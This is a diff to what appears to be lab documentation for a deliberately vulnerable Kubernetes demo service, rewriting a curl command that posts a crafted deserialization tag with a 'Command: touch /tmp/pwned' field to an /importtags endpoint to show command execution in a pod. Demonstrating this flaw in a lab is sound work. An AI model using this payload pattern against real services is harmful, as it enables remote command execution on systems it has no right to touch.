@@ -585,7 +585,8 @@ kubectl port-forward svc/imageservice 8081:80
    ```
 2. Attack, which creates `/tmp/pwned` in the pod:
    ```
-   curl -X POST localhost:8081/importtags --data-binary $'!<!ThumbnailHook,imageservice>\nCommand: touch /tmp/pwned\n'
+   printf '%s\n' '!<!ThumbnailHook,imageservice>' 'Command: touch /tmp/pwned' \
+     | curl -X POST localhost:8081/importtags --data-binary @-
    kubectl exec deploy/cargocats-imageservice -- ls /tmp/pwned
    ```
 
